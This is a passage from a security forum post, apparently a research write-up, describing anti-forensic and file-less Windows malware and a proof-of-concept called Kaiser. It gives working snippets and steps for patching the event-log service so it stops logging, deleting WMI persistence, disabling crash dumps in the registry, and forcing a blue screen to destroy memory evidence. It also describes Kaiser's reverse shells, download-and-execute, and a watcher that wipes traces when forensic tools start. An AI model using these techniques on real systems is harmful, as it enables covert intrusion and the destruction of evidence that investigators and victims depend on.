<p>The event logging service can be patched to prevent writing to the event logs by targetting the <em>wevtsvc.dll</em> module that exists within the corresponding <em>svchost.exe</em> process. The Mimikatz source code<sup><a href="https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/mimikatz/modules/kuhl_m_event.c">25</a></sup> details an inline-patching technique on the <code>Channel::ActualProcessEvent</code> function in <em>wevtsvc.dll</em>. The following disassembly was obtained from IDA Pro:</p>
<pre><code class="lang-auto">; void __thiscall Channel::ActualProcessEvent(Channel *this, struct BinXmlReader *)

            6A 10   push    10
   B8 B8 F9 69 71   mov eax,    offset loc_7169F9B8
   E8 57 EF FF FF   call    __EH_prolog3_0
            8B F1   mov esi,    ecx
         8B 4D 08   mov ecx,    [ebp + arg_0]       ; this
   E8 1C F8 FF FF   call    BinXmlReader::Reset     ; BinXmlReader::Reset(void)
            33 C9   xor ecx,    ecx
38 8E C0 00 00 00   cmp [esi + 0C0h],   cl
            74 0C   jz  short loc_715D286D
</code></pre>
<p>The first instance of the byte pattern <code>8B F1 8B 4D 08 E8</code> is located within the module and then, from an offset of <code>-12</code> (decimal), the bytes are replaced with <code>C2 04 00</code> which disassembles into:</p>
<pre><code class="lang-auto">; void __thiscall Channel::ActualProcessEvent(Channel *this, struct BinXmlReader *)

         C2 04 00   ret 4
</code></pre>
<p>This simply forces the function to return immediately rendering the remaining original code unused.</p>
<h3>2.2.2 Forensic Analysis Prevention</h3>
<p>In the circumstance where there is an attempt to perform analysis on the infected machine, such as acquiring a forensic image of memory, of when the operator decides that the malware is no longer needed on the system, evidence of malicious and suspicious presence and activity should be erased. The following discusses some ways that this can be achieved including: uninstalling persistence mechanisms, removing potential sources of evidence, and destruction of any memory-resident artefacts.</p>
<h4>2.2.2.1 Uninstalling Persistence</h4>
<p>Uninstalling the persistence mechanism from the WMI will prevent execution of the malware in the future. If all malicious payloads are bootstrapped using this persistence, the uninstallation will effectively remove all traces of code thus preventing recovery and therefore, analysis.</p>
<p>Deleting the persistence mechanism in the WMI can be done in C via the <code>IWbemServices</code><sup><a href="https://docs.microsoft.com/en-us/windows/desktop/api/wbemcli/nn-wbemcli-iwbemservices">26</a></sup> interface. After initialisation and connection to the WMI servers <code>root\subscription</code> namespace, the <code>IWbemServices</code> can be used to delete instances for given a path. For example, deleting a <code>CommandLineEventConsumer</code> can be done by:</p>
<pre><code class="lang-auto">// Initialise IWbemServices pointer.
IWbemServices *pSvc = NULL;

// Set path to the WMI instance which shall be deleted.
LPWSTR szPath = L"CommandLineEventConsumer.Name='ExampleConsumer'"

// Delete.
BSTR bPath = SysAllocString(szPath);
HRESULT hRes = pSvc-&gt;lpVtbl-&gt;DeleteInstance(pSvc, bPath, 0, NULL, NULL);
SysFreeString(bPath);
</code></pre>
<h4>2.2.2.2 Wiping Event Logs</h4>
<p>As a precautionary measure, if the system does not forward any logs to a remote server and there is an attempt at anlysis of an infected machine, erasing the event logs removes a major source of information which may be used in a forensic investigation. Clearing the event logs can be done using the <code>EvtClearLog</code> as aforementioned.</p>
<h4>2.2.2.3 Removing Memory Artefacts</h4>
<p>During the circumstance where analysis is being performed on the infected machine, destroying artefacts that are resident in memory is crucial because the malicious code may be caught in a memory image capture. One solution that can destroy the data in memory before an image capture can be performed is by causing the system to shut down or reset. This can be forced by producing a Blue Screen of Death (BSOD). Note that while data in volatile memory will be erased, Windows may generate crash dumps to preserve the state of memory in the event of a BSOD. Disabling crash dumps can be done by modifying the following settings:</p>
<ul>
<li>Registry value <code>RPSessionInterval</code> under the key <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore</code> should be set to <code>0</code>
</li>
<li>Registry subkey <code>Clients</code> under <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\SPP</code> should be deleted</li>
<li>Registry subkey <code>Leases</code> under <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\SPP</code> should be deleted</li>
<li>Registry value <code>CrashDumpEnabled</code> under the key <code>HKLM\System\CurrentControlSet\Control\CrashControl</code> should be set to <code>0</code>
</li>
</ul>
<p>After disabling crash dumps, a BSOD can be created in userland from two methods: calling <code>NtRaiseHardError</code><sup><a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.html">27</a></sup> or by setting a process as critical and then terminating it. To BSOD with <code>NtRaiseHardError</code>, the <code>OptionShutdownSystem</code> parameter must be passed into the <code>HARDERROR_RESPONSE_OPTION</code> parameter and the process must have the <code>SeShutdownPrivilege</code> privilege:</p>
<pre><code class="lang-auto">// Get shutdown privileges.
if (ProcessSetPrivilege(GetCurrentProcess(), SE_SHUTDOWN_NAME, TRUE) == TRUE) {
    HARDERROR_RESPONSE hr;
    // Trigger BSOD.
    NtRaiseHardError(STATUS_ACCESS_DENIED, 0, NULL, NULL, OptionShutdownSystem, &amp;hr);
}
</code></pre>
<p>Creating and terminating a critical process is relatively simple:</p>
<pre><code class="lang-auto">// Set process critical.
RtlSetProcessIsCritical(TRUE, NULL, FALSE);
// Trigger BSOD by terminating critical process.
ExitProcess(0);
</code></pre>
<hr>
<h1>3 Kaiser</h1>
<p>Kaiser is a proof-of-concept malware that was developed to demonstrate the discussed anti-forensic and file-less techniques on the Windows 7 32-bit operating system. They are implemented into several functions that enable or utilise them:</p>
<ul>
<li>
<code>mimikatz</code>: reflectively loads the Mimikatz third-party application into the pre-defined system binarys process via <em>process hollowing</em> and connects back to a user-specified remote address and port for an interactive session over the network. The Mimikatz binary is compressed and embedded into Kaiser.</li>
<li>
<code>shell</code>: reflectively loads the Windows command shell application (<em>cmd.exe</em>) into the pre-defined system binarys process via <em>process hollowing</em> and connects back to a user-specified remote address and port for an interactive session over the network.</li>
<li>
<code>evtlog</code>: enables or disables the event logging service, or clears the event logs of choice. Event logging threads can be suspended or resumed, or the event logging services module can be patched or unpatched.</li>
<li>
<code>rdp</code>: enables or disables the Remote Desktop Protocol.</li>
<li>
<code>dex</code>: Download and EXecute; downloads and reflectively loads an application into the pre-defined system binarys process via <em>process hollowing</em> and optionally connects back to a user-specified remote address and port for an interactive session (console applications only) over the network.</li>
<li>
<code>purge</code>: clears pre-defined event logs, uninstalls WMI persistence mechanism, and/or forces a BSOD. A separate thread is spawned to monitor analysis tools which, when triggered, will activate all of the previous operations.</li>
</ul>
<h2>3.1 Persistence Mechanism</h2>
<p>Kaisers initial infection vector is via a PowerShell script that installs a downloader script into the WMI for persistence. The downloaded script is an instance of <em>Invoke-ReflectivePEInjection.ps1</em><sup><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1#L662">28</a></sup> that, in turn, downloads the <em>Kaiser.dll</em> binary into memory with which it is reflectively injected into the <em>services.exe</em> (by default) process.</p>
<ol>
<li>Install a <code>CommandLineEventConsumer</code> downloader into the WMI that activates every user logon</li>
<li>The downloader script downloads another script that contains <em>Invoke-ReflectivePeInjection.ps1</em> into memory</li>
<li>The second script downloads <em>Kaiser.dll</em> into memory and then calls <em>Invoke-ReflectivePEInjection.ps1</em> to inject into <em>services.exe</em>
</li>
</ol>
<p>Since the WMI consumers run under NT AUTHORITY\SYSTEM, injection into <em>services.exe</em> is possible. Every stage is performed file-lessly and will be true for persistence.</p>
<p>Because there are multiple stages to start Kaiser, it introduces some dependencies such as internet access and that each stage is performed without errors. The advantage of this is that the payload can be updated relatively easily (provided that the download address is the same) and access to the payload can be invalidated by removing the resource.</p>
<h2>3.2 Process-hollowed and Networked Interactive Sessions</h2>
<p>Interactive sessions over the network back to the operator are only available with console applications such as Mimikatz or <em>cmd.exe</em> because they utilise the standard input and output handles. The creation of a process with <em>process hollowing</em> using <code>CreateProcess</code> allows the standard handles to be set to a socket (initialised using <code>WSASocket</code>) via the <code>STATUPINFO</code><sup><a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-_startupinfoa">29</a></sup>structure:</p>
<pre><code class="lang-auto">typedef struct _STARTUPINFOA {
  DWORD  cb;
  LPSTR  lpReserved;
  LPSTR  lpDesktop;
  LPSTR  lpTitle;
  DWORD  dwX;
  DWORD  dwY;
  DWORD  dwXSize;
  DWORD  dwYSize;
  DWORD  dwXCountChars;
  DWORD  dwYCountChars;
  DWORD  dwFillAttribute;
  DWORD  dwFlags;
  WORD   wShowWindow;
  WORD   cbReserved2;
  LPBYTE lpReserved2;
  HANDLE hStdInput;
  HANDLE hStdOutput;
  HANDLE hStdError;
} STARTUPINFOA, *LPSTARTUPINFOA;
</code></pre>
<p>To use the standard handles, the <code>dwFlags</code> member must have the <code>STARTF_USESTDHANDLES</code> value. To direct them over the network, simply set the handles to the value of the socket like so:</p>
<pre><code class="lang-auto">// Initialise the socket using WSASocket.
SOCKET socket = CreateSocket(...);
// Initialise STARTUPINFO structure.
STARTUPINFO si;

// Use the std handles and set it to the socket.
si.dwFlags |= STARTF_USESTDHANDLES;
si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;

// Start process hollowing.
CreateProcess(..., &amp;si, ...);
</code></pre>
<h2>3.3 Active Forensic Analysis Prevention</h2>
<p>The <code>purge</code> module offers a process-monitoring functionality designed to target any analysis tools that may be used against Kaiser. The current example implementation actively searches for new processes that contain the case-insensitive string ftk in its process name to prevent the FTK memory acquisition tools. If the condition is satisfied, it will immediately clear some pre-defined event logs, uninstall the persistence in the WMI and then crash the system with a BSOD in an attempt to protect Kaiser from any form of analysis and prevent any further possible forensic investigation.</p>
<p>Since the persistence was engineered file-lessly and with multiple stages, even if the <code>CommandLineEventConsumer</code> script was obtained, it will only point to the resource from where it downloaded Kaiser Theoretically, this can be easily counter by removing it if the operator was alerted and reacted within time thus, prolonging the lifetime of the malicious code without needing to be redeveloped against signatures.</p>
<h2>3.4 Further Improvements</h2>
<p>Improvements can be developed in order to make Kaiser more effective with regards to anti-forensics, including:</p>
<ul>
<li>Automation of event logging disabling and enabling while performing a malicious task to remove accidental errors from the operator. This is non-trivial because of the non-synchronous nature of how Kaiser operates certain functionality, and event log disabling may occur over a long period of time during shell or Mimikatz usage which may be considered unnecessary.</li>
<li>Automatic uninstall after inactivity from the operator. If, for any particular reason, the operator no longer accesses an instance of Kaiser on an infected machine, it should perform an automatic uninstallation to prevent any unnecessary detection.</li>
<li>Hooking the event logging service to drop events related to Kaiser activity. This could potentially solve the non-trivial solution of automating disabling and enabling while allowing benign entries to be logged seamlessly.</li>
<li>Additional analysis tools to monitor. Currently the only tool(s) that is targeted is FTK. Adding more to the list such as dd and Sysinternals tools would make forensic analysis prevention more effective.</li>
</ul>
<hr>
<h1>4 Conclusion</h1>
<p>This report aimed to show an example subset of file-less and anti-forenisic attacks that can be used by a malicious threat to evade detection and forensic analysis. The eaxmples demonstrated by Kaiser include file-less WMI persistence, backdoor access and execution of third-party applications as well as anti-forensic methods of destroying or disabling sources of forensic evidence such as the event logging service and memory-resident artefacts. These tactics can be abused by sophisticated adversaries to attack systems while minimising risk of being detected and/or traced to avoid any meaningful result from a forensic investigation.</p>
<hr>
<h1>5 References</h1>
<ol>
<li>Microsoft, Fileless threats, <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats">https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats</a>
</li>
<li>Microsoft, Windows Management Instrumentation, <a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wmi-start-page">https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wmi-start-page</a>
</li>
<li>Microsoft, Win32_Process class, <a href="https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/win32-process">https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/win32-process</a>
</li>
<li>Microsoft, Create method of the Win32_Process class, <a href="https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/create-method-in-class-win32-process">https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/create-method-in-class-win32-process</a>
</li>
<li>Microsoft, Determining the Type of Event to Receive, <a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/determining-the-type-of-event-to-receive">https://docs.microsoft.com/en-us/windows/desktop/wmisdk/determining-the-type-of-event-to-receive</a>
</li>
<li>Microsoft, Creating an Event Filter, <a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/creating-an-event-filter">https://docs.microsoft.com/en-us/windows/desktop/wmisdk/creating-an-event-filter</a>
</li>
<li>Microsoft, Win32_LoggedOnUser, <a href="https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/win32-loggedonuser">https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/win32-loggedonuser</a>
</li>
<li>Microsoft, __EventConsumer, <a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/--eventconsumer">https://docs.microsoft.com/en-us/windows/desktop/wmisdk/--eventconsumer</a>
</li>
<li>Microsoft, CommandLineEventConsumer, <a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/commandlineeventconsumer">https://docs.microsoft.com/en-us/windows/desktop/wmisdk/commandlineeventconsumer</a>
</li>
<li>Microsoft, __FilterToConsumerBinding, <a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/--filtertoconsumerbinding">https://docs.microsoft.com/en-us/windows/desktop/wmisdk/--filtertoconsumerbinding</a>
</li>
<li>Microsoft, Peering Inside the PE <a href="https://msdn.microsoft.com/en-au/library/ms809762.aspx">https://msdn.microsoft.com/en-au/library/ms809762.aspx</a>
</li>
<li>ReactOS, IMAGE_BASE_RELOCATION, <a href="https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00162">https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00162</a>
</li>
<li>ReactOS, LdrRelocateImageWithBias, <a href="https://doxygen.reactos.org/df/da2/sdk_2lib_2rtl_2image_8c.html#a61fae0253935550115acc7751e6d6073">https://doxygen.reactos.org/df/da2/sdk_2lib_2rtl_2image_8c.html#a61fae0253935550115acc7751e6d6073</a>
</li>
<li>ReactOS, LdrProcessRelocationBlockLongLong, <a href="https://doxygen.reactos.org/df/da2/sdk_2lib_2rtl_2image_8c.html#a79a460be03d9da50f71d427b26238496">https://doxygen.reactos.org/df/da2/sdk_2lib_2rtl_2image_8c.html#a79a460be03d9da50f71d427b26238496</a>
</li>
<li>ReactOS, IMAGE_IMPORT_DESCRIPTOR, <a href="https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00572">https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00572</a>
</li>
<li>ReactOS, IMAGE_THUNK_DATA, <a href="https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00510">https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00510</a>
</li>
<li>ReactOS, IMAGE_IMPORT_BY_NAME, <a href="https://doxygen.reactos.org/dd/d43/pedump_8c_source.html#l00328">https://doxygen.reactos.org/dd/d43/pedump_8c_source.html#l00328</a>
</li>
<li>Iczelion, Tutorial 6: Import Table, <a href="http://win32assembly.programminghorizon.com/pe-tut6.html">http://win32assembly.programminghorizon.com/pe-tut6.html</a>
</li>
<li>Forensics Wiki, Anti-forensics, <a href="https://www.forensicswiki.org/wiki/Anti-forensic_techniques">https://www.forensicswiki.org/wiki/Anti-forensic_techniques</a>
</li>
<li>MITRE ATT&amp;CK<sup>TM</sup>, Defense Evasion, <a href="https://attack.mitre.org/tactics/TA0005/">https://attack.mitre.org/tactics/TA0005/</a>
</li>
<li>Microsoft, Event Logging, <a href="https://docs.microsoft.com/en-us/windows/desktop/eventlog/event-logging">https://docs.microsoft.com/en-us/windows/desktop/eventlog/event-logging</a>
</li>
<li>Microsoft, EvtClearLog, <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winevt/nf-winevt-evtclearlog">https://docs.microsoft.com/en-us/windows/desktop/api/winevt/nf-winevt-evtclearlog</a>
</li>
<li>Phant0m: Killing Windows Event Log, <a href="https://artofpwn.com/phant0m-killing-windows-event-log.html">https://artofpwn.com/phant0m-killing-windows-event-log.html</a>
</li>
<li>HOWTO: Use I_QueryTagInformation, <a href="https://wj32.org/wp/2010/03/30/howto-use-i_querytaginformation/">https://wj32.org/wp/2010/03/30/howto-use-i_querytaginformation/</a>
</li>
<li>GitHub, Mimikatz Event log, <a href="https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/mimikatz/modules/kuhl_m_event.c">https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/mimikatz/modules/kuhl_m_event.c</a>
</li>
<li>Microsoft, IWbemServices, interface <a href="https://docs.microsoft.com/en-us/windows/desktop/api/wbemcli/nn-wbemcli-iwbemservices">https://docs.microsoft.com/en-us/windows/desktop/api/wbemcli/nn-wbemcli-iwbemservices</a>
</li>
<li>NTAPI Undocumented Functions, NtRaiseHardError, <a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError</a>.</li>
<li>GitHub, Invoke-ReflectivePEInjection.ps1, <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1#L662">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1#L662</a>
</li>
<li>Microsoft, STARTUPINFOA, <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-_startupinfoa">https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-_startupinfoa</a>
</li>
</ol>
<hr>
<p>Thanks for reading! Hope you learned something or just generally enjoyed it! Source can be found on my GitHub here: <a href="https://github.com/NtRaiseHardError/Kaiser">https://github.com/NtRaiseHardError/Kaiser</a></p>
<p> <em>dtm</em></p>
          <p><a href="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/1</link>
        <pubDate>Thu, 06 Dec 2018 07:58:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10008-1</guid>
        <source url="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008.rss">Anti-forensic and File-less Malware</source>
      </item>
  </channel>
</rss>
